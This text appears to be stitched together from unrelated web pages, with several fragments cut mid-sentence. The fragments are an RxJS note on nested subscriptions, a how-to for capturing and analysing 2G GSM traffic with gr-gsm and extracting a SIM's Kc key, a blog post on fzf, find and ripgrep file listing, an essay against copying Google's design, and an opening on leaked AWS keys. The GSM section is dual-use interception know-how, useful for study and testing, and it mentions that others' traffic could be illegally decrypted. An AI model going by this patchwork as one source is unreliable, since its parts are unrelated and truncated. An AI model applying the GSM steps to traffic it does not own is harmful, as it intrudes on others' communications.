<p><img src="https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=600&amp;name=Gif5.gif" alt="Gif5" width="600" srcset="https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=300&amp;name=Gif5.gif 300w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=600&amp;name=Gif5.gif 600w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=900&amp;name=Gif5.gif 900w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=1200&amp;name=Gif5.gif 1200w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=1500&amp;name=Gif5.gif 1500w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=1800&amp;name=Gif5.gif 1800w" sizes="(max-width: 600px) 100vw, 600px"></p>
<p>What we see here is that, instead of updating the <code>drinksCarousel</code> attribute and removing the previous list of values we had with the new one freshly fetched, multiple observables coexist and affect the state of our component simultaneously.</p>
<p>To come back to our analogy of the magazine subscription, what we would like to perform is to change the magazine we subscribe to, however, with nested subscribes, our code is creating a subscription to this new magazine, without terminating the previous one.</p>
<p>Every time our source observable (the search valueChanges) changes, the code inside the subscription is executed again. A new HTTP response is received, a new interval stream is created, thus creating another state change every 1.5s. Indeed none of the subscriptions are canceled, and they stack up silently into a huge mess until your computer crashes.</p></span></p></div></div></div>

                    <p>Looking at 2G GSM traffic three decades since its inception might not sound terribly interesting, but the protocol is still surprisingly common today. It's often used a fallback for when coverage is limited and more modern protocols aren't available, as well as for legacy IoT devices.</p><p>In Norway, Telia and Telenor are in the process of phasing our their 3G networks. At they same time they are keeping their 2G networks operational <a href="https://www.telenor.no/bedrift/iot/m2m/3g/">until at least 2025</a>. Meaning all devices that don't support VoLTE will use 2G for calls and SMS.</p><p>There are well documented security flaws in GSM, and publicly available tools to exploit them. At the same time, it has become considerably cheaper and easier to analyze GSM traffic over the past few years. Open source tools such as <a href="https://github.com/ptrkrysik/gr-gsm">gr-gsm</a> have matured, and the community has developed methods for capturing the GSM spectrum without the need for expensive SDR radios.</p><p>With less than $100 and a weekend it's possible to capture and analyze GSM traffic. With some extra effort it's possible to decrypt your own traffic, and depending on how your mobile provider has set up their network it may even be possible for somebody else to illegally decrypt traffic they don't own.</p><h3 id="the-gsm-spectrum">The GSM spectrum</h3><figure><img src="https://harrisonsand.com/content/images/2021/02/Screenshot_20210208_122702.png" alt="" srcset="https://harrisonsand.com/content/images/size/w600/2021/02/Screenshot_20210208_122702.png 600w, https://harrisonsand.com/content/images/size/w1000/2021/02/Screenshot_20210208_122702.png 1000w, https://harrisonsand.com/content/images/size/w1600/2021/02/Screenshot_20210208_122702.png 1600w, https://harrisonsand.com/content/images/2021/02/Screenshot_20210208_122702.png 1920w" sizes="(min-width: 1200px) 1200px"><figcaption>GSM spectrum, showing multiple channels</figcaption></figure><p>More often than not traffic will "hop" between different channels during a transmission. Hops occur quite quickly, every few milliseconds or so. In practice, this normally means if you're interested in looking at more than a base station's broadcast control channel (BCCH) you need a way to simultaneously capture multiple channels at once.</p><p>You can visually see the hopping in the screenshot above. Stationary control traffic is on the left, and hopping traffic is on the right. These "slices" are produced as the base stations hop between different channels during transmission.</p><p>A local tower of mine is configured to hop between ARFCN channels 57 and 112. This corresponds to downlink frequencies of 946.4 and 957.4 MHz. Channels have a bandwidth of 0.2 MHz, so that means if I want to look at both channels at once I need a radio with a bandwidth of at least 11.2 MHz (946.3 to 957.5). Keep in mind towers will be configured differently, potentially using more channels spread further apart.</p><p>Inexpensive SDRs tend to have a maximum bandwidth of about 2.4 MHz. You can overcome this limitation by using multiple radios and <a href="https://github.com/ptrkrysik/multi-rtl">multi-rtl</a>, which combines their signals together to get a larger effective bandwidth.</p><p>In my case I had access to a <a href="https://www.ettus.com/product-categories/usrp-bus-series/">USRP radio</a> that can capture up to 56 MHz of bandwidth, and that's what I'll be using for my tests. However, the core concepts are identical no matter what radio you use.</p><h3 id="other-hardware">Other hardware</h3><p>If you want to decrypt your own traffic you'll need a way to get the Kc encryption key from your SIM card. Several guides out there use a series of AT+CRSM commands that access the SIM card through the phone's modem. I have gotten this to work in the past, but many phones don't expose the modem's serial interface by default, and even if you can get access it tends to be a messy process. I prefer to use a smart card reader to pull the key from the SIM directly.</p><p>I purchased a HID OMNIKEY 6121 USB smart card reader, and some adapters from the <a href="https://piswords.aliexpress.com/store/829772">Piswords AliExpress store</a> to make it a bit less fiddly to swap SIMs in and out.</p><h3 id="software">Software</h3><p>Recent versions of Ubuntu have gr-gsm in their repositories by default. Installation on Kubuntu 20.10 was as easy as:</p><pre><code>sudo apt install gr-gsm wireshark gqrx-sdr cardpeek</code></pre><p>You'll need Wireshark for looking at traffic, gqrx if you want to visually see the spectrum, and Cardpeek for pulling keys off the SIM card.</p><p>For the USRP you'll need a bit more setup. First download the latest firmware images and then set the UHD_IMAGES_DIR environment variable.</p><pre><code>sudo uhd_images_downloader
export UHD_IMAGES_DIR=/usr/share/uhd/images</code></pre><p>Next, we configure the system so non-root users can access the radio.</p><pre><code>sudo cp /usr/lib/uhd/utils/uhd-usrp.rules /etc/udev/rules.d/
sudo udevadm control --reload-rules
sudo udevadm trigger</code></pre><p>You can test if everything is working by scanning for nearby base stations with the <code>grgsm_scanner</code> utility. It takes about a minute to start displaying data.</p><figure><img src="https://harrisonsand.com/content/images/2021/02/Screenshot_20210207_160020.png" alt="" srcset="https://harrisonsand.com/content/images/size/w600/2021/02/Screenshot_20210207_160020.png 600w, https://harrisonsand.com/content/images/size/w1000/2021/02/Screenshot_20210207_160020.png 1000w, https://harrisonsand.com/content/images/2021/02/Screenshot_20210207_160020.png 1177w"></figure><h3 id="find-the-base-station">Find the base station</h3><p>Before we can capture traffic we need to know what base station our phone is connected to. This is <em>probably</em> the station with the best signal strength, so in my scan above that would be CID 2106 on ARFCN channel 57. But to be sure lets double check.</p><p>On an iPhone you can dial <code>*3001#12345#*</code> which takes you to field test mode. Go to the "All Metrics" tab and scroll down to GSM Serving Cell Info.</p><figure><img src="https://harrisonsand.com/content/images/2021/02/21-02-07-16-25-45-1531-2.png" alt="" srcset="https://harrisonsand.com/content/images/size/w600/2021/02/21-02-07-16-25-45-1531-2.png 600w, https://harrisonsand.com/content/images/size/w1000/2021/02/21-02-07-16-25-45-1531-2.png 1000w, https://harrisonsand.com/content/images/2021/02/21-02-07-16-25-45-1531-2.png 1125w" sizes="(min-width: 720px) 720px"></figure><p>You can see that the ARFCN is set to 57, as we suspected. You can also look under "GSM Idle Config" to verify that the ci matches the CID from the scan, in this case 2106.</p><p>On Android the <a href="https://play.google.com/store/apps/details?id=com.wilysis.cellinfolite">Network Cell Info Lite</a> app provides similar information.</p><h3 id="base-station-arfcns">Base station ARFCNs</h3><p>Next, we need to find out what channels the base station is configured to use. This is so we know what frequencies to configure our capture for. A list of these channels is periodically broadcast inside the System Information Type 1 packets from the BCCH. </p><p>The <code>grgsm_livemon</code> utility allows us to monitor data from the BCCH. Use the <code>-f</code> flag to set the frequency of the base station. You can find this in the output from <code>grgsm_scanner</code>, or by using the <a href="https://www.cellmapper.net/arfcn">cellmapper.net</a> ARFCN frequency calculator. (use the downlink frequency)</p><pre><code>grgsm_livemon -f 946.4M</code></pre><p>Traffic is piped to the system's loopback interface inside UDP packets on port 4729. You can use this display filter to only show Type 1 packets: <code>gsm_a.dtap.msg_rr_type == 0x19</code>.</p><figure><img src="https://harrisonsand.com/content/images/2021/02/Screenshot_20210207_164557.png" alt="" srcset="https://harrisonsand.com/content/images/size/w600/2021/02/Screenshot_20210207_164557.png 600w, https://harrisonsand.com/content/images/size/w1000/2021/02/Screenshot_20210207_164557.png 1000w, https://harrisonsand.com/content/images/size/w1600/2021/02/Screenshot_20210207_164557.png 1600w, https://harrisonsand.com/content/images/2021/02/Screenshot_20210207_164557.png 1960w" sizes="(min-width: 1200px) 1200px"></figure><p>Looking under Cell Channel Description we can see that this base station is configured to use two ARFCNs: 57 and 112.</p><h3 id="capturing-traffic">Capturing traffic</h3><p>Using the ARFCN calculator we can see that the downlink frequencies for those channels are 946.4 and 957.4 MHz. The minimum frequency range to capture both would be 946.3 to 957.5 MHz. Adding 0.1 MHz to each end to account for the 0.2 MHz channel bandwidth.</p><p>For the capture itself, we'll use the <code>grgsm_capture</code> utility. We can use the <code>-f</code> flag to set the center frequency between our two channels, and the <code>-s</code> flag to set a sufficient sample rate / bandwidth.</p><pre><code>Usage: grgsm_capture [options] output_filename

</code></pre><p>The center frequency is set to 951.9 MHz, and the sample rate / bandwidth is set to 12 MHz. Technically we could go down to 11.2 MHz, but 12 is a nice even number so that's what I'll use here. You can also configure the gain, but I found the default of 30 dBi to work fine.</p><p>If you see 0's printed in your console it means your dropping samples in the capture. This basically means your computer can't keep up with the data streaming from the SDR. A common cause of dropped samples are spikes in disk writes from the capture utility, and the disk can't save the data fast enough. Increasing the buffer on the USRP can help, which we do via the <code>--args</code> flag. You could also try capturing data with the <code>uhd_rx_cfile</code> utlity, which may perform slightly better.</p><p>If you still get dropped samples, you could also try saving capture files to the <code>/dev/shm/</code> directory. This will store the capture files in memory instead of disk, which has performance benefits. The downside here is there will be less storage space for the capture.</p><pre><code>grgsm_capture --args="uhd,num_recv_frames=1024" -f 951.9M -s 12.0M call.cfile</code></pre><p><strong>Note: </strong>Before taking the capture you need to make sure your phone is communicating over GSM/2G. Most phones let you set this within the cellular data options, though depending on your exact phone and carrier settings the option may be hidden. If you don't see the option try using a different phone. The lowest I could go on my iPhone was 3G, but Android let me set 2G. Also worth noting is that my iPhone would have automatically downgraded to 2G if I disabled 4G and was in an area without 3G coverage.</p><p>Start the capture, and Ctrl+C out once you're done. Keep in mind at this point we're just capturing the downlink traffic from the base station to the phone. Some good tests would be to either place a call or receive a text message.</p><h3 id="channelize-capture">Channelize capture</h3><p><code>call.cfile</code> is "wideband" capture that contains two ARFCNs. For further processing with gr-gsm we need to split each channel into its own capture file.</p><p>We can use the <code>grgsm_channelize</code> utility for this. Set the frequency and sample rate so they're the same as when we did the capture. At the end of the command append the list of ARFCNs to extract.</p><figure><img src="https://harrisonsand.com/content/images/2021/02/Screenshot_20210207_193136.png" alt="" srcset="https://harrisonsand.com/content/images/size/w600/2021/02/Screenshot_20210207_193136.png 600w, https://harrisonsand.com/content/images/size/w1000/2021/02/Screenshot_20210207_193136.png 1000w, https://harrisonsand.com/content/images/2021/02/Screenshot_20210207_193136.png 1113w"></figure><p>A new folder will be created that contains separate capture files for each ARFCN.</p><h3 id="analyzing-bcch-traffic">Analyzing BCCH traffic</h3><p>Now we can decode the BCCH traffic from our capture.

<p>In a pipeline context, <code>fzf</code> will present choices given to it in that pipeline, i.e. via STDIN, like this:</p>

<div><div><pre><code><span>;</span> <span>printf</span> <span>"one</span><span>\n</span><span>two</span><span>\n</span><span>three"</span> | fzf <span>--layout</span><span>=</span>reverse <span>--height</span><span>=</span>40%
<span>&gt;</span>
  3/3
<span>&gt;</span> one
  two
  three
</code></pre></div></div>

<blockquote>
  <p>Interestingly, to copy/paste this example from my terminal, I had to (discover and) use the <code>--no-mouse</code> option from the Interface category so that the mouse was free to use and not locked to <code>fzf</code> during that moment.</p>
</blockquote>

<p>But I want to think about using <code>fzf</code> in a pipeline at another time; right now I’m just digging into options where <code>fzf</code> is used without receiving anything on STDIN.</p>

<p><a name="default-command"></a>
<strong>Default command</strong></p>

<p>So what does <code>fzf</code> do if it’s not fed anything to display via STDIN? Well, the README states that unless otherwise directed, <code>fzf</code> uses the <code>find</code> command to build the list of items. The actual sentence in the <a href="https://github.com/junegunn/fzf#usage">Usage</a> section reads as follows:</p>

<p><em>“Without STDIN pipe, fzf will use find command to fetch the list of files excluding hidden ones.”</em></p>

<p>At first, I stopped reading after “fzf will use find command to fetch the list of files”, and missed the “excluding hidden ones”.</p>

<p><a name="basic-uses-of-find"></a>
<strong>Basic uses of <code>find</code></strong></p>

<p>That careless omission did cause me a pleasant coffee length digression into the nuances of basic uses of the <code>find</code> command. I created a set of test files and directories like this, some hidden, some not, as you can see:</p>

<div><div><pre><code><span>.</span>
├── Fruit
│&nbsp;&nbsp; ├── apple
│&nbsp;&nbsp; ├── banana
│&nbsp;&nbsp; ├── cherry
│&nbsp;&nbsp; └── .damson
├── .Trees
│&nbsp;&nbsp; ├── ash
│&nbsp;&nbsp; └── birch
├── aardvark
├── badger
└── .cow
</code></pre></div></div>

<p>If pressed, I’d say that I’d naturally use the following incantation as a basic way to find files and directories: <code>find . -type f</code>. The results are interesting.</p>

<blockquote>
  <p>In all the following examples, I’m in the directory denoted by <code>.</code> at the top of the tree as shown above. The <code>;</code> is my simple prompt (inspired by <a href="https://twitter.com/thingskatedid">Kate</a>), with my directory location shown in a line above that (<code># /tmp/testdir</code>).</p>
</blockquote>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> find <span>.</span> <span>-type</span> f
./Fruit/apple
./Fruit/cherry
./Fruit/.damson
./Fruit/banana
./.cow
./aardvark
./.Trees/birch
./.Trees/ash
./badger
<span># /tmp/testdir</span>
<span>;</span>
</code></pre></div></div>

<p>(9 entries)</p>

<p>I’d always considered that the “default” behaviour, but on reflection, it’s arguably not default, as I’m using something specific (<code>.</code>) as the first argument to <code>find</code>, whereas I could just as easily have used <code>*</code>, thus:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> find <span>*</span> <span>-type</span> f
Fruit/apple
Fruit/cherry
Fruit/.damson
Fruit/banana
aardvark
badger
<span># /tmp/testdir</span>
<span>;</span>
</code></pre></div></div>

<p>(6 entries)</p>

<p>That’s quite a difference! The Stack Overflow entry <a href="https://stackoverflow.com/questions/46578534/difference-between-find-and-find-in-unix">Difference between find . and find * in unix</a> confirms that difference.</p>

<ul>
  <li>passing <code>.</code> results in everything in <code>.</code> being found, including the hidden file <code>.cow</code> and the hidden directory (and its contents) <code>.Trees/</code></li>
  <li>passing <code>*</code> results in only the “visible” content in <code>.</code> being returned; note that this visibility difference only applies to the starting directory in question - as <code>Fruit/.damson</code> was reported even though <code>.cow</code> and <code>.Trees/</code> weren’t</li>
</ul>

<p>So I wonder if either of these two incantations are what <code>fzf</code> uses by default. Let’s see what <code>fzf</code> gives, in this same starting directory:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> fzf <span>--height</span><span>=</span>40% <span>--reverse</span>
<span>&gt;</span>
  5/5
<span>&gt;</span> Fruit/apple
  Fruit/cherry
  Fruit/banana
  aardvark
  badger
</code></pre></div></div>

<p>(5 entries)</p>

<p>Nope!</p>

<p>Of course, there’s that “excluding hidden ones” phrase from the README to which I must now pay attention. What I need is to tell <code>find</code> explicitly to exclude hidden files and directories. This will do the trick:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> find <span>.</span> <span>-type</span> f <span>-not</span> <span>-path</span> <span>'*/\.*'</span>
./Fruit/apple
./Fruit/cherry
./Fruit/banana
./aardvark
./badger
<span># /tmp/testdir</span>
<span>;</span>
</code></pre></div></div>

<p>(5 entries)</p>

<p>That’s more like it! In fact, because we’re explicitly excluding content based on a pattern, the same results are forthcoming whether we use a <code>.</code> or <code>*</code> as the first argument to <code>find</code>. Here’s what we get with a <code>*</code>:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> find <span>*</span> <span>-type</span> f <span>-not</span> <span>-path</span> <span>'*/\.*'</span>
Fruit/apple
Fruit/cherry
Fruit/banana
aardvark
badger
<span># /tmp/testdir</span>
<span>;</span>
</code></pre></div></div>

<p>(5 entries)</p>

<p>OK, there is a subtle difference, in that in this latter case, the <code>./</code> prefix is not included in the output of each entry. This is closest to what we see with <code>fzf</code> too.</p>

<p><a name="FZF_DEFAULT_COMMAND"></a>
<strong>FZF_DEFAULT_COMMAND</strong></p>

<p>So if I wanted <code>fzf</code> to actually show me hidden files, how would I do that? Well of course one way would be to run the appropriate <code>find</code> command and then pipe the output into <code>fzf</code>, like this:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> find <span>.</span> <span>-type</span> f  | fzf <span>--height</span><span>=</span>40% <span>--reverse</span>
<span>&gt;</span>
  9/9
<span>&gt;</span> ./Fruit/apple
  ./Fruit/cherry
  ./Fruit/.damson
  ./Fruit/banana
  ./.cow
  ./aardvark
  ./.Trees/birch
  ./.Trees/ash
  ./badger
</code></pre></div></div>

<p>But I want to leave the pipeline approach until another time. Can I influence <code>fzf</code>’s search behaviour when, as the README puts it, “input is [the] tty”?</p>

<p>The answer is yes and is in the form of the environment variable <code>FZF_DEFAULT_COMMAND</code>. If set, <code>fzf</code> will use its value as the command to execute to find the files to display. So instead of using the pipeline above, I could do this:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> <span>export </span><span>FZF_DEFAULT_COMMAND</span><span>=</span><span>'find . -type f'</span>
<span># /tmp/testdir</span>
<span>;</span> fzf <span>--height</span><span>=</span>40% <span>--reverse</span>
<span>&gt;</span>
  9/9
<span>&gt;</span> ./Fruit/apple
  ./Fruit/cherry
  ./Fruit/.damson
  ./Fruit/banana
  ./.cow
  ./aardvark
  ./.Trees/birch
  ./.Trees/ash
  ./badger
</code></pre></div></div>

<p>Nice - now <code>fzf</code> shows me hidden files.</p>

<p><a name="alternative-commands"></a>
<strong>Alternative commands</strong></p>

<p>If we can modify what <code>fzf</code> uses to find files, we can go further, as the README suggests, and use another utility entirely, as described in the README’s <a href="https://github.com/junegunn/fzf#tips">Tips</a> section (and hinted at also in the <a href="https://github.com/junegunn/fzf#environment-variables">Environment variables</a> section).</p>

<p>I’ve installed the search utility <a href="https://github.com/BurntSushi/ripgrep">ripgrep</a>, known as <code>rg</code>, as it works for me in a more natural <a href="https://en.wikipedia.org/wiki/DWIM">DWIM</a> (Do What I Mean) mode.</p>

<p>Let’s see what <code>rg</code> will do for us with the same content. It is as much like <code>grep</code> than <code>find</code> and so we need to tell it to search at the file level, with <code>--files</code>, for the purposes of this exploration:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> rg <span>--files</span>
badger
aardvark
Fruit/banana
Fruit/cherry
Fruit/apple
<span># /tmp/testdir</span>
<span>;</span>
</code></pre></div></div>

<p>(5 entries)</p>

<p><code>rg</code> won’t consider hidden files and directories unless told to explicitly with <code>--hidden</code>:</p>

<div><div><pre><code># /tmp/testdir
; rg --files --hidden
badger
.Trees/ash
.Trees/birch
aardvark
.cow
Fruit/banana
Fruit/.damson
Fruit/cherry
Fruit/apple
# /tmp/testdir
;
</code></pre></div></div>

<p>(9 entries)</p>

<p>At this level, <code>rg</code> delivers results similar to what we already get with <code>find</code>.</p>

<p><a name="respecting-.gitignore"></a>
<strong>Respecting .gitignore</strong></p>

<p>Where <code>rg</code> comes into its own, DWIM-like, is when the search in question is within a git repository. In that case, it will respect what you have in your <a href="https://git-scm.com/docs/gitignore"><code>.gitignore</code></a> file.</p>

<p>I was curious to see this in action in the context of the simple set of files above. I added a <code>.gitignore</code> file in <code>/tmp/testdir</code> containing a single entry (<code>Fruit</code>) and then ran both <code>find . -type f -not -path '*/\.*'</code> and <code>rg --files</code>:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> <span>cat</span> .gitignore
Fruit
<span># /tmp/testdir</span>
<span>;</span> find <span>.</span> <span>-type</span> f <span>-not</span> <span>-path</span> <span>'*/\.*'</span>
./Fruit/apple
./Fruit/cherry
./Fruit/banana
./aardvark
./badger
<span># /tmp/testdir</span>
<span>;</span> rg <span>--files</span>
badger
aardvark
Fruit/banana
Fruit/cherry
Fruit/apple
<span># /tmp/testdir</span>
<span>;</span>
</code></pre></div></div>

<p>Hmm, so what’s going on here? They both produce the same list of files, despite the presence of the <code>.gitignore</code> file and its contents.</p>

<p>Turns out that it will only respect <code>.gitignore</code> in the context of an actual git repository, which makes sense. So a quick <code>git init</code> in the directory later, and we now see a different result for <code>rg --files</code>:</p>

<div><div><pre><code><span># /tmp/testdir</span>
<span>;</span> git init
Initialized empty Git repository <span>in</span> /private/tmp/testdir/.git/
<span># /tmp/testdir (master #%)</span>
<span>;</span> rg <span>--files</span>
badger
aardvark
<span># /tmp/testdir (master #%)</span>
<span>;</span>
</code></pre></div></div>

<p>That’s more like it - the <code>Fruit/</code> directory and its contents are ignored.</p>

<p><a name="using-rg-for-real"></a>
<strong>Using rg for real</strong></p>

<p>Moving back to the <a href="https://github.com/SAP-samples/teched2020-developer-keynote">repository</a> content that I have been using to explore <code>fzf</code> in more depth (especially in <a href="https://qmacro.org/autodidactics/2021/02/02/fzf-the-basics-1-layout/">fzf - the basics part 1 - layout</a>), let’s see what effect <code>rg</code>’s respect for <code>.gitignore</code> has on the results in this more realistic scenario.</p>

<p>First, what does the incantation of <code>find</code> that most closely resembles <code>fzf</code>’s default behaviour give us from the top level of that repository?</p>

<div><div><pre><code><span># /tmp/teched2020-developer-keynote (main *=)</span>
<span>;</span> find <span>.</span> <span>-type</span> f <span>-not</span> <span>-path</span> <span>'*/\.*'</span>  | <span>wc</span> <span>-l</span>
   17688
<span># /tmp/teched2020-developer-keynote (main *=)</span>
<span>;</span>
</code></pre></div></div>

<p>OK, so that’s what we got in the <a href="https://qmacro.org/autodidactics/2021/02/02/fzf-the-basics-1-layout/">previous post</a>. The repository has a <code>.gitignore</code> file:</p>

<div><div><pre><code><span># /tmp/teched2020-developer-keynote (main *=)</span>
<span>;</span> <span>cat</span> .gitignore
node_modules/
<span>*</span>.swp
sk<span>*</span>.json
default-env.json
.DS_Store
dashboard.zip
mta_archives/
ui/resources
<span>*</span>.db-journal
<span>*</span>.token
kubeconfig.<span>*</span>
<span># /tmp/teched2020-developer-keynote (main *=)</span>
<span>;</span>
</code></pre></div></div>

<p>So let’s see what <code>rg</code> gives us:</p>

<div><div><pre><code><span># /tmp/teched2020-developer-keynote (main *=)</span>
<span>;</span> rg <span>--files</span> | <span>wc</span> <span>-l</span>
     163
<span># /tmp/teched2020-developer-keynote (main *=)</span>
<span>;</span>
</code></pre></div></div>

<p>That is certainly a huge difference, mostly a result of ignoring a load of stuff - not least in the various <code>node_modules/</code> directories within the repository.</p>

<p><a name="showing-hidden-files"></a>
<strong>Showing hidden files</strong></p>

<p>Now that the list of choices is more manageable, I can now start to think about what it actually contains, and what it doesn’t contain. There are hidden files in the repository that I actually want to be able to select. <code>fzf</code>’s default behaviour is preventing that from happening, but it’s only now that my head is clear enough to address this (looking through a list of 17000+ files fogged my thinking).</p>

<p>So I remember I can use the <code>--hidden</code> option with <code>rg</code>; let’s try that:</p>

<div><div><pre><code><span># /tmp/teched2020-developer-keynote (main *=)</span>
<span>;</span> rg <span>--files</span> <span>--hidden</span> | <span>wc</span> <span>-l</span>
     209
<span># /tmp/teched2020-developer-keynote (main *=)</span>
<span>;</span>
</code></pre></div></div>

<p>OK, so a few more than the 163 that <code>rg --files</code> returned. Good stuff. But what are those extra …</p></div></article></div></div></div>

<p>“That’s not what Google’s doing!” is a phrase I’ve heard all too often in my career to criticize product solutions. It’s a preposterous statement because it implies that decisions differing from Google's are inherently wrong, and must be righted by copying their solution pixel for pixel. The problem is that doing so doesn’t often lead to success, for a wide variety of reasons.&nbsp;</p>



<p>The first is simply because no one is going to beat Google at Google. They’re operating at a completely different scale, with limitless resources, in a unique position in the marketplace, and are almost certainly offering a unique product. Copying them just ensures you’re permanently behind. By the time the copier designs, builds, markets, and releases their copy, Google or any other competitor will have improved further, and have continued to win a larger pie of the market.&nbsp;</p>



<p>Don’t get me wrong, Google has a long track record of consistently launching successful products. Google Stadia seems to be <a href="https://www.cnn.com/2021/02/01/tech/google-stadia-sge-shutdown/index.html" target="_blank" rel="noreferrer noopener">going really well</a>, Google+ had <a href="https://www.techtimes.com/articles/51205/20150506/many-users-google-really.htm#:~:text=Officially%2C%20Google%2B%20has%20more%20than,as%20many%20members%20as%20Facebook." target="_blank" rel="noreferrer noopener">a billion users</a>, Google Wave was basically <a href="https://gizmodo.com/what-in-the-hell-was-google-wave-trying-to-be-anyway-1835038967" target="_blank" rel="noreferrer noopener">Slack before Slack</a>, and Google Glass is apparently <a href="https://www.google.com/glass/start/https://www.google.com/glass/start/" target="_blank" rel="noreferrer noopener">still a thing</a>! The reality is that Alphabet is mega successful because the vast majority of its revenue comes from its advertising platform, which primarily earns cash off of its first product… Google Search.</p>



<p>But what about Material Design? I know I’ve established my ability for sarcasm but Material Design is actually a fantastic design system, and they keep improving it. In late 2019, Google performed hundreds of usability testing sessions and hundreds of preference ranking sessions to investigate the usability and accessibility of their form fields. <a rel="noreferrer noopener" href="https://medium.com/google-design/the-evolution-of-material-designs-text-fields-603688b3fe03" data-type="URL" data-id="https://medium.com/google-design/the-evolution-of-material-designs-text-fields-603688b3fe03" target="_blank">The results</a> showed that their form fields performed poorly, especially when filled with large amounts of text.</p>



<figure><img loading="lazy" src="https://brandonsax.com/wp-content/uploads/2021/02/0_yTxoZXR5wDzrAj5D-1.png" alt="" width="1024" height="329"><figcaption>Google's old form fields (left) and one of their improved test versions (right) </figcaption></figure>



<p>Afterwards, some writers called out that Google <a href="https://www.matsuko.ca/blog/stop-using-material-design-text-fields/" target="_blank" rel="noreferrer noopener">got it wrong</a>, but I know that Google didn’t know any better. If only I had applied to Google on April 3, 2016 and documented the usability opportunities of their form fields, specifically within their application experience. Oh wait, I had. Let’s read those receipts, shall we?</p>



<p>“There is little visual distinction between subsections, such as in individual jobs. This leads to confusion when identifying which details pertain to which job, especially when the user is in the midst of input. This problem is exacerbated by the large distance between individual fields, and that distance also is inconsistent within subsections.” (Bless up to Evernote for saving this.) Google could have saved all that money and effort had they actually read my application three and a half years earlier. Just saying! I’m not bitter! Really!</p>



<h4>Bare Minimum</h4>



<p>“This is industry standard,” is the broader example of copying Google, and when the phrase is used to defend work to stakeholders, it’s typically followed by heads around the room nodding along, either in bliss knowing that the solution has been soundly justified, or in fear of questioning the status quo. The problem is apparent in the term itself. "Industry standard” means “the&nbsp;generally accepted <em>requirements</em> followed by the members of an industry.” So when you justify a decision with that, you’re aiming for the bare minimum, probably because it’s easy, acceptable, and doesn’t rock the boat. Just know that aiming for that low bar doesn’t lead to market success.&nbsp;</p>

<p>Of course there are obvious exceptions. I’m happy there are construction standards so buildings have fire escapes, don’t collapse, and accommodate all people. As a product designer, I’m happy there are standard patterns so engrained into user’s behavior that if I leverage those patterns, users will already know how to use the product, like a navigation bar or form field. That said, a standard building isn’t going to garner any awards for sustainability or architecture, and I still have to make decisions regarding how more complex functionality should be displayed to the user while making the experience feel intuitive.&nbsp;</p>



<h4>Is it really industry standard?</h4>



<p>I question whether “That is industry standard” is even true. Was industry research actually performed by evaluating the competition, summarizing the pros and cons of each approach, and arriving at a conclusion to copy a competitor? In most cases the answer is no. It’s a convenient argument in the moment because it’s one less thing for the speaker to do. Their time saved on research and thinking is paid for with the opportunity-cost of innovation, preventing the speaker from leapfrogging the competition and radically improving an area of the industry.&nbsp;</p>



<figure><img loading="lazy" width="1024" height="576" src="https://brandonsax.com/wp-content/uploads/2021/01/EOQKV1sUUAArdKN-1024x576.jpg" alt="" srcset="https://brandonsax.com/wp-content/uploads/2021/01/EOQKV1sUUAArdKN-1024x576.jpg 1024w, https://brandonsax.com/wp-content/uploads/2021/01/EOQKV1sUUAArdKN-300x169.jpg 300w, https://brandonsax.com/wp-content/uploads/2021/01/EOQKV1sUUAArdKN-768x432.jpg 768w, https://brandonsax.com/wp-content/uploads/2021/01/EOQKV1sUUAArdKN.jpg 1200w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Kirk Goldsberry, Top 200 Shot Locations in the NBA</figcaption></figure>



<p>If you dig into the history of why something is standard, you may uncover that the solution has never been carefully considered, like how until ten years ago, professional basketball players took their shots on the court in remarkably inefficient places. It could also be that the standard hasn’t kept up with technological advancements, like Nuclear power. Almost all power plants in existence today are based off designs made with slide rulers, not computers, and are ripe for innovation. Either way, real problems may exist in the status quo that have been ignored or people grew blind to. If you’re coming into a new project, you’re at the perfect time to reevaluate assumptions and innovate. It’s much cheaper to consider something in the research and design phase than once it’s built and you need to shoehorn a solution in.&nbsp;</p>



<h4>Psychology of Industry Standard</h4>



<p>The urge to copy big brands comes from heuristics. Heuristics are basically mental shortcuts, and the study of them tells us that humans are risk-adverse and cognitively lazy. We see something that works and instinctively copy it to avoid failure, which has the added benefit of conserving our cognitive load. At Google’s scale their product decisions also become the “default” in many people’s minds, and deviating from that is scary, but ironically copying a large institution like Google <a href="https://www.nngroup.com/articles/risks-imitating-designs/" target="_blank" rel="noreferrer noopener">brings a high risk of failure</a>. It’s like copying the winning lottery numbers from two days ago; it’s a verbatim repeat of successful steps but in a completely different set of circumstances. It’s not any more likely to work than anything else.&nbsp;</p>



<h4>Conclusion</h4>



<p>For a product to have success, it’s critical for it to have a unique market fit, and the way to do that is to make your own decisions. Evaluate your unique situation and build accordingly. Each product has unique qualities that earn customers, and success is earned through empowering those customers to succeed while generating value for the business.</p>

Fraudsters constantly scan public code repositories for these secrets to gain a foothold in to systems. Code is more connected than ever so often these secrets provide access to private and sensitive data — cloud infrastructures, database servers, payment gateways, and file storage systems to name a few. But what happens <em>after</em> a secret is leaked? And what is the potential fallout?</p>
<h4>
Fraudsters compromised our cloud infrastructure in less than a minute after leaking AWS keys to a public GitHub repository
</h4>
<p>One thing is for certain: the fallout can be catastrophic in terms of financial loss and reputational damage. The now-infamous Uber data breach of 2016 was the result of an engineer accidentally uploading credentials to a public GitHub repository. These credentials allowed bad actors to access Uber's backend databases and confidential information. This breach ultimately resulted in a then-record-breaking <a href="https://www.theguardian.com/technology/2018/sep/26/uber-hack-fine-driver-data-breach" target="_blank" rel="nofollow">$148 million fine</a> — ouch.</p>
